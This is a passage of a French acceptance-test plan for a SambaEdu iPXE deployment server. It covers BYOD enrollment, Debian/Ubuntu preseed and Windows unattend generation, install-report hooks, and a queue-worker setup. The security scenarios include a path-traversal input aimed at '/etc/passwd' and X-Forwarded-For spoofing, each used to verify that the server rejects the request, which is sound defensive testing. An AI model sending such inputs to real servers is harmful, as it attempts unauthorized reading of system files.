- `machine_name` : hostname ou `byod:<name>` pour le flow BYOD.

#### Scénario 3.3-14 — Flow BYOD (audit-only — pas d'AD, pas de Workstation)

```bash
COUNT_WS=$(sudo -u postgres psql -d sambaedu -tA -c 'SELECT COUNT(*) FROM workstations;')
curl -sS -X POST http://192.168.122.50/ipxe/enrollment/byod \
  -d 'mac=aa:bb:cc:dd:ee:bd&uuid=bbbbbbbb-1111-bbbb-2222-bbbbbbbbbbbb&new_name=student-laptop-byod'

# Vérification : aucune Workstation créée.
COUNT_WS_AFTER=$(sudo -u postgres psql -d sambaedu -tA -c 'SELECT COUNT(*) FROM workstations;')
[ "$COUNT_WS" = "$COUNT_WS_AFTER" ] && echo OK || echo FAIL

# Vérification : log audit présent.
sudo -u postgres psql -d sambaedu -c \
  "SELECT * FROM machine_boot_logs WHERE machine_name='byod:student-laptop-byod';"
```

**Critères d'acceptation** :
- Body contient `echo BYOD enregistre pour student-laptop-byod`.
- Workstation count : inchangé (D5 — BYOD = audit-only en 3.3).
- `MachineBootLog` : 1 row avec `action='ipxe_enroll_byod'`, `workstation_id=null`, `machine_name='byod:student-laptop-byod'`.
- Aucun appel `samba-tool` (vérifier `auth.log`).
- Log channel `ipxe` : event `ipxe.enrollment.byod.logged` (info).

#### Scénario 3.3-15 — Feature-flag `ipxe.enrollment.enabled = false`

```bash
# En .env : IPXE_ENROLLMENT_ENABLED=false
php artisan config:clear

curl -sS -X POST http://192.168.122.50/ipxe/admin \
  -d 'mac=aa:bb:cc:dd:ee:99&uuid=12345678-1234-1234-1234-000000000099'
```

**Critères d'acceptation** :
- Body NE contient PAS `item --key n set-name`, `item --key a salle`, `item --key p parcs`, `item --key e enleveparc`.
- Body contient `item --key m maintenance` (poste connu — maintenance reste accessible).
- Body contient `item --key x exit` (toujours accessible).

#### (Optionnel) Scénario 3.3-16 — Smoke poste réel (PXE boot enrollment complet)

> **À jouer en pré-prod uniquement, sur poste de test (jamais sur poste prod)**.

```
1. Brancher un poste neuf sur LAN scolaire.
2. Configurer PXE boot prioritaire en BIOS.
3. Reboot → préambule iPXE 3.1 → menu known/unknown selon résolution.
4. Choisir option login admin (`1` ou similaire) → /ipxe/admin natif.
5. Choisir `(n) Nommer le poste` → saisie hostname (ex. pc-smoke-33-1).
6. Vérifier le menu de succès → chain admin.
7. Choisir `(a) Affecter a une salle` → liste de salles → choisir une.
8. Vérifier le succès → chain admin.
9. Choisir `(p) Ajouter a un parc` → liste de parcs → choisir un.
10. Vérifier le succès → chain admin.
11. Choisir `(x) exit` → boot disque.

Vérifications post-smoke :
- `samba-tool computer show pc-smoke-33-1` → présent + netbootGUID renseigné.
- `SELECT * FROM workstations WHERE name='pc-smoke-33-1';` → ligne complète avec `physical_room_id`.
- `SELECT * FROM workstation_group_workstation WHERE workstation_id=...;` → row ajoutée.
- `tail -f storage/logs/ipxe/ipxe-$(date +%F).log` → events `ipxe.enrollment.*.success`.
```

---

## Story 3.4 — Installation Linux (Debian/Ubuntu)

**Date livraison** : 2026-05-20
**Migrations à appliquer** : aucune (D9/D12 — réutilisation `Workstation` + `MachineBootLog` ; 3 nouvelles valeurs `action` ≤18 chars dans varchar(20) sans CHECK)
**Permissions requises** : aucune (cf. Story 3.1-3.3 — `auth.v1.lan-only` seul)
**Variables `.env` à vérifier** : `SAMBAEDU_LINUX_LOCALE`, `SAMBAEDU_LDAP_ADMIN_PASSWD`, `SAMBAEDU_ADMIN_PASSWD`, `SAMBAEDU_DOMAIN`, `SAMBAEDU_LDAP_BASE_DN`, `SAMBAEDU_SAMBA_DOMAIN`, `SAMBAEDU_LDAP_PORT`, `SAMBAEDU_SE4AD_NAME`, `SAMBAEDU_SE4_PUB_KEY` (cf. story 3.4 § D11)
**Décisions ratifiées** : D14 variantes hors-scope déférées Phase 3 (se4ad/se4fs/deb_serv/kiosk/nextcloud/gnome_perso/primtux), D3 secrets preseed acceptés sur LAN (auth.v1.lan-only seul), D15 endpoint `/ipxe/linux/autorun` = stub minimal, `Workstation::status` minimal (`installation Linux terminee` ou `installation Linux echouee (ret=X)`)

### Section 13 — Endpoints natifs `/ipxe/installation-linux` + `/ipxe/linux/*`

#### Scénario 3.4-1 — Menu installation-linux rendu (poste connu)

```bash
# Pré-condition : poste seedé en base.
curl -sS -X POST http://192.168.122.50/ipxe/installation-linux \
  -d 'mac=aa:bb:cc:dd:ee:01&uuid=12345678-1234-1234-1234-aaaaaaaaaaaa'
```

**Critères d'acceptation** :
- HTTP 200 + `Content-Type: text/plain; charset=utf-8`.
- Body commence par `#!ipxe`.
- Body contient `item install_deb_gnome Debian + GNOME` (défaut menu).
- Body contient `item install_ubuntu64 Ubuntu 20.04`.
- Body contient `item install_nird NIRD`.
- Body contient sections `:install_deb_gnome\nchain --replace --autofree http://.../ipxe/action/install_deb_gnome##params`.
- Body contient `:exit\n...sanboot...` (fallback boot disk).
- Headers : `Cache-Control: no-store`, `X-Robots-Tag: noindex`.
- Log channel `ipxe` : event `ipxe.install_linux.menu_rendered` avec `menu_variant='known'`.
- `MachineBootLog` : row avec `action='ipxe_install_linux'`.

#### Scénario 3.4-2 — Menu installation-linux poste inconnu

```bash
curl -sS -X POST http://192.168.122.50/ipxe/installation-linux \
  -d 'mac=00:00:00:00:00:00&uuid=00000000-0000-0000-0000-000000000000'
```

**Critères d'acceptation** :
- Body contient `echo Erreur - poste non encore enregistre`.
- Body contient `chain --replace --autofree http://192.168.122.50/ipxe/admin##params`.
- Body NE contient PAS `item install_deb_*` (le menu erreur masque les items).
- Log channel `ipxe` : event `ipxe.install_linux.menu_rendered` avec `menu_variant='unknown'`.

#### Scénario 3.4-3 — Item `(l) Installation Linux` visible dans /ipxe/admin

```bash
curl -sS -X POST http://192.168.122.50/ipxe/admin \
  -d 'mac=aa:bb:cc:dd:ee:01&uuid=12345678-1234-1234-1234-aaaaaaaaaaaa'
```

**Critères d'acceptation** :
- Body contient `item --key l install-linux (l) Installation Linux (Debian/Ubuntu)`.
- Body contient section `:install-linux\nchain --replace --autofree http://192.168.122.50/ipxe/installation-linux##params`.

**Feature-flag** : `IPXE_INSTALL_LINUX_ENABLED=false` dans `.env` → item absent (testé via test feature `IpxeAdminEndpointTest::it_hides_install_linux_item_when_disabled`).

#### Scénario 3.4-4 — Action `install_deb_gnome` rendue (kernel cmdline)

```bash
curl -sS -X POST http://192.168.122.50/ipxe/action/install_deb_gnome \
  -d 'mac=aa:bb:cc:dd:ee:01&uuid=12345678-1234-1234-1234-aaaaaaaaaaaa'
```

**Critères d'acceptation** :
- Body commence par `#!ipxe`.
- Body contient `kernel http://192.168.122.50/ipxe/debian-installer/amd64/linux` (ou OS_URL configuré).
- Body contient `initrd --name initrd.gz http://.../debian-installer/amd64/initrd.gz`.
- Body contient `imgargs linux initrd=initrd.gz auto=true hostname=PC-XXX priority=critical auto url=http://.../ipxe/linux/preseed?mac=...&uuid=...&os=trixie&type=gnome`.
- Body se termine par `boot\n`.

#### Scénario 3.4-5 — Action `install_ubuntu64` rendue

```bash
curl -sS -X POST http://192.168.122.50/ipxe/action/install_ubuntu64 \
  -d 'mac=aa:bb:cc:dd:ee:01&uuid=12345678-1234-1234-1234-aaaaaaaaaaaa'
```

**Critères d'acceptation** :
- `kernel http://.../ubuntu-installer/amd64/linux` (paths Ubuntu, pas Debian).
- `imgargs ... url=...?os=ubuntu&type=base&perso=1` (Ubuntu = perso=1, parité legacy).

#### Scénario 3.4-6 — Action `install_nird` rendue

```bash
curl -sS -X POST http://192.168.122.50/ipxe/action/install_nird \
  -d 'mac=aa:bb:cc:dd:ee:01&uuid=12345678-1234-1234-1234-aaaaaaaaaaaa'
```

**Critères d'acceptation** :
- `kernel http://.../nird/casper/vmlinuz` (paths Nird/casper).
- `imgargs vmlinuz initrd=initrd.gz root=/dev/nfs boot=casper netboot=nfs nfsroot=<se4fs_ip>:/var/sambaedu/unattended/install/os/nird root ip=dhcp ... url=...?os=debian&type=base&perso=1`.

#### Scénario 3.4-7 — Preseed généré (debian/gnome)

```bash
curl -sS 'http://192.168.122.50/ipxe/linux/preseed?mac=aa:bb:cc:dd:ee:01&uuid=12345678-1234-1234-1234-aaaaaaaaaaaa&os=trixie&type=gnome'
```

**Critères d'acceptation** :
- HTTP 200 + `Content-Type: text/plain; charset=utf-8`.
- Body ~4000 chars, commence par `### Fichier de réponses préconfigurées`.
- Body contient `tasksel tasksel/first multiselect standard, desktop, gnome-desktop, print-server, ssh-server` (iso `debian_gnome.cfg`).
- Body contient `d-i netcfg/get_hostname string pc-XXX` (interpolation hostname lowercase).
- Body contient `d-i passwd/root-password password <admin-passwd>` (secret de la `.env`).
- Body contient `partman-auto/method string regular` (simple_boot.cfg).
- AUCUN placeholder résiduel `###_..._###`.
- `MachineBootLog` : row avec `action='ipxe_linux_preseed'`.
- Log channel `ipxe` : event `ipxe.linux.preseed.generated` avec `preseed_sha256`, `preseed_size_bytes`, `distribution`, `variant`. **PAS** de log du contenu du preseed.

#### Scénario 3.4-8 — Preseed poste inconnu

```bash
curl -sS -o /dev/null -w '%{http_code}\n' \
  'http://192.168.122.50/ipxe/linux/preseed?mac=00:00:00:00:00:00&uuid=99999999-9999-9999-9999-999999999999&os=trixie&type=gnome'
```

**Critères d'acceptation** :
- HTTP 404.
- Log channel `ipxe` : event `ipxe.linux.preseed.unknown_workstation` niveau warning + `mac_prefix=00:00:` + `uuid_prefix=99999999`.

#### Scénario 3.4-9 — Preseed os/type hors whitelist

```bash
curl -sS -o /dev/null -w '%{http_code}\n' \
  'http://192.168.122.50/ipxe/linux/preseed?mac=aa:bb:cc:dd:ee:01&uuid=12345678-1234-1234-1234-aaaaaaaaaaaa&os=macos&type=gnome'
```

**Critères d'acceptation** :
- HTTP 422.
- Log channel `ipxe` : event `ipxe.linux.preseed.invalid_distribution` (ou `invalid_variant` selon le champ rejeté).
- `raw_distribution` (tronqué 32 chars + sanitize ASCII).

**Variante anti-path-traversal** :
```bash
curl -sS '.../linux/preseed?...&os=../../../etc/passwd&type=gnome'
```
→ 422 (Rule::in de la FormRequest rejette).

#### Scénario 3.4-10 — Hook `/ipxe/linux/action` (fin install ret=0)

```bash
curl -sS -X POST \
  -F 'ret=0' \
  -F 'uuid=12345678-1234-1234-1234-aaaaaaaaaaaa' \
  -F 'name=PC-XXX' \
  http://192.168.122.50/ipxe/linux/action
```

**Critères d'acceptation** :
- HTTP 200 + body vide (parité legacy `action.php:39`).
- PostgreSQL : `SELECT os, status FROM workstations WHERE uuid='12345678-1234-1234-1234-aaaaaaaaaaaa'` → `os='linux'`, `status='installation Linux terminee'`.
- `last_report_at` mis à jour à maintenant.
- `MachineBootLog` : row avec `action='ipxe_linux_report'` + `success=true`.
- Log channel `ipxe` : event `ipxe.linux.action.success` niveau info.

**Variante échec** (`ret=99`) → `status='installation Linux echouee (ret=99)'` + event `ipxe.linux.action.failure` niveau warning.

#### Scénario 3.4-11 — Stub `/ipxe/linux/autorun` (D15)

```bash
curl -sS 'http://192.168.122.50/ipxe/linux/autorun?mac=aa:bb:cc:dd:ee:01&uuid=12345678-1234-1234-1234-aaaaaaaaaaaa&name=PC-XXX'
```

**Critères d'acceptation** :
- HTTP 200 + `Content-Type: text/plain; charset=utf-8`.
- Body commence par `#!/bin/bash`.
- Body contient `echo 'install Linux completed for PC-XXX (12345678-1234-1234-1234-aaaaaaaaaaaa)'`.
- Body se termine par `exit 0\n`.
- Log channel `ipxe` : event `ipxe.linux.autorun.served` niveau info.

#### Scénario 3.4-12 — Sécurité LAN (depuis IP publique)

```bash
# Simulation d'appel depuis une IP publique (ex: 8.8.8.8 via REMOTE_ADDR spoofing
# côté Apache pour test — en pratique impossible en LAN scolaire).
curl -sS -H 'X-Forwarded-For: 8.8.8.8' -o /dev/null -w '%{http_code}\n' \
  http://192.168.122.50/ipxe/installation-linux
```

**Critères d'acceptation** :
- HTTP 403 + body contient code `bootstrap.not_lan` (iso 16.11).
- AUCUN preseed ni menu ne fuit (le middleware bloque avant le controller).

#### (Optionnel) Scénario 3.4-13 — Non-régression menu admin 3.2 + items enrollment 3.3

```bash
curl -sS -X POST http://192.168.122.50/ipxe/admin \
  -d 'mac=aa:bb:cc:dd:ee:01&uuid=12345678-1234-1234-1234-aaaaaaaaaaaa'
```

**Critères d'acceptation** :
- Body contient l'item enrollment 3.3 `item --key n set-name` (non-régression).
- Body contient l'item maintenance 3.2 `item --key m maintenance` (non-régression).
- Body contient l'item installation Linux 3.4 `item --key l install-linux` (nouveau).
- Body contient le retour `item --key r retour` (toujours présent).

#### (Optionnel) Scénario 3.4-14 — Smoke poste réel (install Debian complète)

> **À jouer en pré-prod uniquement, sur poste de test sans données importantes**.

```
1. Brancher un poste neuf (ou existant en base) sur LAN scolaire.
2. PXE boot → préambule iPXE 3.1 → menu known.
3. Choisir option login admin → /ipxe/admin natif (3.2).
4. Choisir `(l) Installation Linux` → /ipxe/installation-linux (3.4).
5. Choisir un item (ex: `install_deb_gnome` Debian + GNOME).
6. Le firmware iPXE charge `kernel http://.../debian-installer/amd64/linux`.
7. Debian-installer boot et fetch `/ipxe/linux/preseed?mac=...&os=trixie&type=gnome`.
8. Installation Debian se déroule sans intervention (~30-60 min).
9. À la fin du preseed, `late_command` exécute `curl -F 'ret=0' .../ipxe/linux/action`.
10. Le poste reboot sur le disque.

Vérifications post-smoke :
- `SELECT os, status, last_report_at FROM workstations WHERE name='PC-XXX';` → `os='linux'`, `status='installation Linux terminee'`.
- `SELECT count(*) FROM machine_boot_logs WHERE workstation_id=... AND action LIKE 'ipxe_linux_%';` → ≥2 (1× preseed + 1× report).
- `tail storage/logs/ipxe/ipxe-$(date +%F).log` → events `ipxe.install_linux.menu_rendered`, `ipxe.linux.preseed.generated`, `ipxe.linux.action.success`.
- `ssh root@PC-XXX 'uname -a'` → Debian trixie installé.
- `samba-tool computer show PC-XXX` → poste joint au domaine AD.
```

## Story 3.5 — Installation Windows (Sysprep/Wimboot)

**Date livraison** : 2026-05-21
**Migrations à appliquer** : aucune (D9/D12 — réutilisation `Workstation` + `MachineBootLog` ; 5 nouvelles valeurs `action` ≤17 chars dans varchar(20) sans CHECK)
**Permissions requises** : aucune (cf. Story 3.1-3.4 — `auth.v1.lan-only` seul)
**Variables `.env` à vérifier** : `SAMBAEDU_ADMINSE_NAME`, `SAMBAEDU_ADMINSE_PASSWD`, `SAMBAEDU_WIN_KEY`, `SAMBAEDU_WIN_USER`, `SAMBAEDU_WIN_USER_PASSWD`, `SAMBAEDU_WIN_AUTOLOGON`, `SE4INSTALL_NAME`, `SE4INSTALL_PASSWD`, `SAMBAEDU_DOMAIN`, `SE4FS_IP`, `SE4FS_NAME` (cf. story 3.5 § D11)
**Décisions ratifiées** : D14 `installw11old` déférée 3.7, D15 `/ipxe/windows/sysprep.xml` = stub minimal (body vide + log), D10 `unattend.xml`/`install.bat`/`diskpart.txt` = NON Blade (DOMDocument + string concat), D7 CRLF `\r\n` strict pour WinPE, D3 secrets `unattend`/`install.bat` acceptés sur LAN (auth.v1.lan-only seul)

### Section 14 — Endpoints natifs `/ipxe/installation-windows` + `/ipxe/windows/*`

#### Scénario 3.5-1 — Menu installation-windows rendu (poste connu)

```bash
# Pré-condition : poste seedé en base.
curl -sS -X POST http://192.168.122.50/ipxe/installation-windows \
  -d 'mac=aa:bb:cc:dd:ee:01&uuid=12345678-1234-1234-1234-aaaaaaaaaaaa'
```

**Critères d'acceptation** :
- HTTP 200 + `Content-Type: text/plain; charset=utf-8`.
- Body commence par `#!ipxe`.
- Body contient les 7 items : `item install_win10 ...`, `item install_win10_debug ...`, `item install_win10_disk ...`, `item install_win10_perso ...`, `item install_win11 ...`, `item install_win11_disk ...`, `item install_win11_perso ...`.
- Body contient `set menu-default install_win11` (D11 default).
- Body contient sections `:install_win11\nchain --replace --autofree http://.../ipxe/action/install_win11##params`.
- Body contient `:exit\n...sanboot...` (fallback boot disk).
- Headers : `Cache-Control: no-store`, `X-Robots-Tag: noindex`.
- Log channel `ipxe` : event `ipxe.install_windows.menu_rendered` avec `menu_variant='known'`.
- `MachineBootLog` : row avec `action='ipxe_install_win'`.

#### Scénario 3.5-2 — Menu installation-windows poste inconnu

```bash
curl -sS -X POST http://192.168.122.50/ipxe/installation-windows \
  -d 'mac=00:00:00:00:00:00&uuid=00000000-0000-0000-0000-000000000000'
```

**Critères d'acceptation** :
- Body contient `echo Erreur - poste non encore enregistre`.
- Body contient `chain --replace --autofree http://192.168.122.50/ipxe/admin##params`.
- Body NE contient PAS `item install_win*` (menu erreur masque les items).
- Log channel `ipxe` : event `ipxe.install_windows.menu_rendered` avec `menu_variant='unknown'`.

#### Scénario 3.5-3 — Item `(w) Installation Windows` visible dans /ipxe/admin

```bash
curl -sS -X POST http://192.168.122.50/ipxe/admin \
  -d 'mac=aa:bb:cc:dd:ee:01&uuid=12345678-1234-1234-1234-aaaaaaaaaaaa'
```

**Critères d'acceptation** :
- Body contient `item --key w install-windows (w) Installation Windows (Win10/Win11)`.
- Body contient section `:install-windows\nchain --replace --autofree http://192.168.122.50/ipxe/installation-windows##params`.

**Feature-flag** : `IPXE_INSTALL_WINDOWS_ENABLED=false` dans `.env` → item absent (testé via `IpxeAdminEndpointTest::it_hides_install_windows_item_when_disabled`).

#### Scénario 3.5-4 — Action `install_win11` rendue (kernel cmdline)

```bash
curl -sS -X POST http://192.168.122.50/ipxe/action/install_win11 \
  -d 'mac=aa:bb:cc:dd:ee:01&uuid=12345678-1234-1234-1234-aaaaaaaaaaaa'
```

**Critères d'acceptation** :
- Body commence par `#!ipxe`.
- Body contient `kernel Win10/wimboot` (iso-legacy — assets partagés Win10/Win11).
- Body contient `initrd --name winpeshl.ini Win10/winpeshl.ini winpeshl.ini`.
- Body contient `param version Win11` + `param action wimboot11` + `param debug 0`.
- Body contient `initrd --name install.bat http://.../ipxe/windows/install.bat##params install.bat`.
- Body contient `initrd --name unattend.xml http://.../ipxe/windows/unattend.xml##params unattend.xml`.
- Body contient `initrd --name BCD Win11/boot/bcd BCD`.
- Body contient `initrd --name boot.wim Win11/sources/boot.wim boot.wim`.
- Body se termine par `boot\n`.

#### Scénario 3.5-5 — Action `install_win10_perso` rendue avec perso=1

```bash
curl -sS -X POST http://192.168.122.50/ipxe/action/install_win10_perso \
  -d 'mac=aa:bb:cc:dd:ee:01&uuid=12345678-1234-1234-1234-aaaaaaaaaaaa'
```

**Critères d'acceptation** :
- Body contient `param version Win10` + `param perso 1`.
- Body contient `initrd --name BCD Win10/boot/bcd` (Win10 assets).

#### Scénario 3.5-6 — Action `install_win11_disk` rendue avec disk=1

```bash
curl -sS -X POST http://192.168.122.50/ipxe/action/install_win11_disk \
  -d 'mac=aa:bb:cc:dd:ee:01&uuid=12345678-1234-1234-1234-aaaaaaaaaaaa'
```

**Critères d'acceptation** :
- Body contient `param version Win11` + `param disk 1`.

#### Scénario 3.5-7 — install.bat WinPE généré

```bash
curl -sS 'http://192.168.122.50/ipxe/windows/install.bat?mac=aa:bb:cc:dd:ee:01&uuid=12345678-1234-1234-1234-aaaaaaaaaaaa&version=Win11&bios=uefi'
```

**Critères d'acceptation** :
- HTTP 200 + `Content-Type: text/plain; charset=utf-8`.
- Body commence par `::cmd\r\n` (iso-legacy install.bat.php:13).
- Toutes les lignes finissent par `\r\n` (CRLF strict — critique WinPE).
- Body contient `wpeutil InitializeNetwork\r\n`, `IPCONFIG /RENEW\r\n`, `@PING <se4fs_ip>\r\n`.
- Body contient `@net use z: \\<se4fs_name>\install /user:<se4install_name>@<domain> <se4install_passwd>\r\n`.
- Body contient `z:\os\Win11\sources\setup.exe /unattend:x:\windows\system32\unattend.xml\r\n`.
- Body contient `curl ... -F "etape=winpe" -F "name=<PC-101>" -F "ret=0" http://<se4fs_name>/ipxe/windows/action` (URL native — pas `.php`).
- Si `bios=uefi` : body contient `%windir%\system32\bcdboot c:\windows /addlast\r\n`.
- Si `debug=1` : body contient `PAUSE\r\n` après chaque section critique.
- Log channel `ipxe` : event `ipxe.windows.install_bat.generated` avec `bash_sha256`, `bash_size_bytes`, `version`, `debug`. **PAS** de log du contenu bash.
- `MachineBootLog` : row avec `action='ipxe_win_install'`.

#### Scénario 3.5-8 — unattend.xml généré pour Win11 UEFI

```bash
curl -sS 'http://192.168.122.50/ipxe/windows/unattend.xml?mac=aa:bb:cc:dd:ee:01&uuid=12345678-1234-1234-1234-aaaaaaaaaaaa&version=Win11&bios=uefi&disk=0&perso=0'
```

**Critères d'acceptation** :
- HTTP 200 + `Content-Type: text/plain; charset=utf-8`.
- Body commence par `<?xml version="1.0"`.
- Body parsable via `DOMDocument::loadXML()` sans erreur.
- Body contient `BypassTPMCheck`, `BypassSecureBootCheck`, `BypassRAMCheck`, `BypassCPUCheck`, `BypassStorageCheck` (Win11).
- Body contient `<Type>EFI</Type>` et `<Label>Windows</Label>` (DiskConfiguration UEFI).
- Body contient `<ComputerName>pc-101</ComputerName>` (interpolation hostname lowercase).
- Body contient `Microsoft-Windows-UnattendedJoin` avec `<JoinDomain>example.org</JoinDomain>` et `<MachineObjectOU>...</MachineObjectOU>`.
- Body contient `<LocalAccount>...adminse...</LocalAccount>`.
- AUCUN placeholder résiduel `###_..._###`.
- `MachineBootLog` : row avec `action='ipxe_win_unattend'`.
- Log channel `ipxe` : event `ipxe.windows.unattend.generated` avec `xml_sha256`, `xml_size_bytes`, `version`, `bios`, `join`. **PAS** de log du contenu XML (secrets).

#### Scénario 3.5-9 — unattend.xml poste inconnu (404)

```bash
curl -sS -o /dev/null -w '%{http_code}\n' \
  'http://192.168.122.50/ipxe/windows/unattend.xml?mac=00:00:00:00:00:00&uuid=99999999-9999-9999-9999-999999999999&version=Win11&bios=uefi'
```

**Critères d'acceptation** :
- HTTP 404.
- Log channel `ipxe` : event `ipxe.windows.unattend.unknown_workstation` niveau warning + `mac_prefix=00:00:` + `uuid_prefix=99999999`.

#### Scénario 3.5-10 — unattend.xml version hors whitelist (422)

```bash
curl -sS -o /dev/null -w '%{http_code}\n' \
  'http://192.168.122.50/ipxe/windows/unattend.xml?mac=aa:bb:cc:dd:ee:01&uuid=12345678-1234-1234-1234-aaaaaaaaaaaa&version=Win99&bios=uefi'
```

**Critères d'acceptation** :
- HTTP 422 (FormRequest Rule::in bloque + defense in depth controller).

#### Scénario 3.5-11 — Hook `/ipxe/windows/action` étape `winpe`

```bash
curl -sS -F 'etape=winpe' -F 'ret=0' -F 'uuid=12345678-1234-1234-1234-aaaaaaaaaaaa' -F 'name=PC-101' \
  http://192.168.122.50/ipxe/windows/action
```

**Critères d'acceptation** :
- HTTP 200 + body vide.
- `SELECT status FROM workstations WHERE uuid='12345678-1234-1234-1234-aaaaaaaaaaaa'` retourne `'installation WinPE'`.
- `MachineBootLog` : row avec `action='ipxe_win_install'`.
- Log channel `ipxe` : event `ipxe.windows.action.winpe_start`.

#### Scénario 3.5-12 — Hook `/ipxe/windows/action` étape `oobe`

```bash
curl -sS -F 'etape=oobe' -F 'ret=0' -F 'uuid=12345678-1234-1234-1234-aaaaaaaaaaaa' -F 'name=PC-101' \
  http://192.168.122.50/ipxe/windows/action
```

**Critères d'acceptation** :
- HTTP 200 + body vide.
- `SELECT os FROM workstations WHERE uuid='12345678-1234-1234-1234-aaaaaaaaaaaa'` retourne `'windows'`.
- `SELECT status FROM workstations WHERE uuid='...'` retourne `'installation Windows terminee'`.
- `SELECT last_report_at FROM workstations WHERE uuid='...'` retourne `NOW()` (à 1s près).
- `MachineBootLog` : row avec `action='ipxe_win_report'`.
- Log channel `ipxe` : event `ipxe.windows.action.oobe_complete`.

#### Scénario 3.5-13 — Hook étape déférée 3.7 (`sysprep`/`join`/etc.)

```bash
curl -sS -F 'etape=sysprep' -F 'ret=0' -F 'uuid=12345678-1234-1234-1234-aaaaaaaaaaaa' \
  http://192.168.122.50/ipxe/windows/action
```

**Critères d'acceptation** :
- HTTP 200 + body vide.
- Log channel `ipxe` : event `ipxe.windows.action.unsupported_step` niveau warning + `raw_etape='sysprep'`.
- `Workstation::status` inchangé (étape non gérée scope 3.5).

#### Scénario 3.5-14 — diskpart.txt servi (body iso-legacy)

```bash
curl -sS 'http://192.168.122.50/ipxe/windows/diskpart.txt?mac=aa:bb:cc:dd:ee:01&uuid=12345678-1234-1234-1234-aaaaaaaaaaaa'
```

**Critères d'acceptation** :
- HTTP 200 + body strict `select disk O\r\nselect partition 1\r\nassign letter=U\r\n`.
- Headers : `text/plain`, `no-store`.
- `MachineBootLog` : row avec `action='ipxe_win_diskpart'`.

#### Scénario 3.5-15 — sysprep.xml stub (body vide)

```bash
curl -sS -o /dev/null -w '%{http_code}\n' \
  'http://192.168.122.50/ipxe/windows/sysprep.xml?name=PC-101'
```

**Critères d'acceptation** :
- HTTP 200 + body vide (stub D15).
- Log channel `ipxe` : event `ipxe.windows.sysprep.stub_served`.
- AUCUN insert `MachineBootLog` (stub minimal).

#### Scénario 3.5-16 — Sécurité LAN (depuis IP publique)

```bash
# Simule un appel hors LAN (depuis 1.2.3.4 via X-Forwarded-For — devrait être ignoré).
curl -sS -o /dev/null -w '%{http_code}\n' \
  -H 'X-Forwarded-For: 1.2.3.4' \
  http://192.168.122.50/ipxe/installation-windows
```

**Critères d'acceptation** :
- HTTP 403 + code `bootstrap.not_lan` (cf. middleware `auth.v1.lan-only`).

#### Scénario 3.5-17 — Non-régression catchall (routes `.php` legacy)

```bash
curl -sS -o /dev/null -w '%{http_code}\n' http://192.168.122.50/ipxe/Win10/repair.bat.php
curl -sS -o /dev/null -w '%{http_code}\n' http://192.168.122.50/ipxe/clonage.php
curl -sS -o /dev/null -w '%{http_code}\n' http://192.168.122.50/ipxe/installation-windows.php
```

**Critères d'acceptation** :
- Les 3 URLs retournent un body legacy (via catchall).
- `SELECT path FROM legacy_catchall_logs WHERE path LIKE '%Win10/repair.bat.php%'` → ≥1 row.

#### Scénario 3.5-18 — (Optionnel pré-prod) Smoke poste réel boot PXE → install Win11

**Pré-conditions** :
- Poste de test inscrit en base PostgreSQL + AD via Story 3.3.
- Assets binaires VM : `Win10/wimboot`, `Win10/winpeshl.ini`, `Win11/boot/bcd`, `Win11/boot/boot.sdi`, `Win11/sources/boot.wim` présents sous `/var/sambaedu/unattended/install/os/`.
- Variables `.env` Win configurées : `SAMBAEDU_ADMINSE_*`, `SAMBAEDU_WIN_KEY`, `SE4INSTALL_*`.

**Procédure** :
1. Boot le poste de test en mode PXE.
2. Au menu iPXE : choisir `(1) Login admin` → `(w) Installation Windows` → `Installation Win11 (auto)`.
3. WinPE charge wimboot + winpeshl + install.bat + unattend.xml.
4. WinPE monte `\\se4fs\install` et lance `setup.exe /unattend:unattend.xml`.
5. Windows install se déroule (~15-30 min).
6. Premier reboot → OOBE → 1st logon → curl hook OOBE.
7. Vérifier `SELECT os FROM workstations WHERE name='<hostname>'` = `'windows'`.
8. Vérifier `SELECT status FROM workstations WHERE name='<hostname>'` = `'installation Windows terminee'`.

---

## Story 3.6 — Gestion ISO Windows

**Date livraison** : 2026-05-21
**Migrations à appliquer** : 1 nouvelle migration `2026_05_21_120000_create_windows_iso_downloads_table.php` (table dédiée audit téléchargements — D9)
**Permissions requises** : `server.admin` (Spatie — iso `/admin/sync-from-ad`, `/admin/settings`)
**Variables `.env` à vérifier** :
- `IPXE_ISO_MANAGEMENT_ENABLED=true` (master switch — défaut `true`)
- `IPXE_ISO_DEPLOYED_OS_BASE=/var/sambaedu/unattended/install/os`
- `IPXE_ISO_STORAGE_PATH=/var/sambaedu/unattended/install/os/iso`
- `IPXE_ISO_ALLOWED_HOSTS=software-static.download.prss.microsoft.com,software-download.microsoft.com,download.microsoft.com`
- `IPXE_ISO_QUEUE=ipxe_iso_downloads`
- `IPXE_ISO_DOWNLOAD_TIMEOUT=7200`, `IPXE_ISO_EXTRACT_TIMEOUT=1800`
- `SAMBAEDU_INSTALL_WIN_ISO_SCRIPT=/usr/share/sambaedu/scripts/install-win-iso.sh`
- `SAMBAEDU_INSTALL_WIN_ISO_SUDO_USER=www-admin` (informatif uniquement)
- `CACHE_DRIVER` doit autoriser `Cache::lock()` (file/redis OK — pas array en prod)

**Décisions ratifiées** : D1 sous-namespace `App\Ipxe\Iso\*`, D2 1 route Livewire fullpage `/admin/ipxe/iso-windows`, D3 `can:server.admin`, D4 Laravel Queue (pas `batch_command` legacy), D5 2 couches validation URL anti-SSRF/RCE, D6 lecture filesystem best-effort, D7 orchestrator entry-point Livewire, D8 Job Process curl + sudo install-win-iso.sh + escapeshellarg, D9 nouvelle table `windows_iso_downloads`, D10 Livewire SFC iso `/admin/sync-from-ad`, D11 configs `ipxe.iso_management` + `sambaedu.windows_iso`, D12 pas d'extension `MachineBootLog`, D13 pas d'item menu iPXE firmware, D14 5 events log channel `ipxe`, D15 `Cache::lock` global 7200s + `WithoutOverlapping` Job defense-in-depth

### Section 15 — Page admin web SE5 `/admin/ipxe/iso-windows`

#### Prérequis VM (T0.5 actions Henri pré-merge)

> 4 points à valider AVANT le premier smoke test 3.6 — si l'un manque, le Job échouera avec un message clair côté toast (ex. "no tty present and no askpass program specified" = sudoers manquant).

1. **Worker queue systemd** — créer `/etc/systemd/system/laravel-queue-ipxe-iso.service` :
   ```ini
   [Unit]
   Description=Laravel Queue worker — ipxe_iso_downloads
   After=network.target postgresql.service

   [Service]
   User=www-admin
   Group=www-admin
   Restart=always
   WorkingDirectory=/var/www/sambaedu-reload
   ExecStart=/usr/bin/php artisan queue:work --queue=ipxe_iso_downloads --tries=1 --timeout=7500 --memory=512

   [Install]
   WantedBy=multi-user.target
   ```
   Puis `systemctl daemon-reload && systemctl enable --now laravel-queue-ipxe-iso.service`.
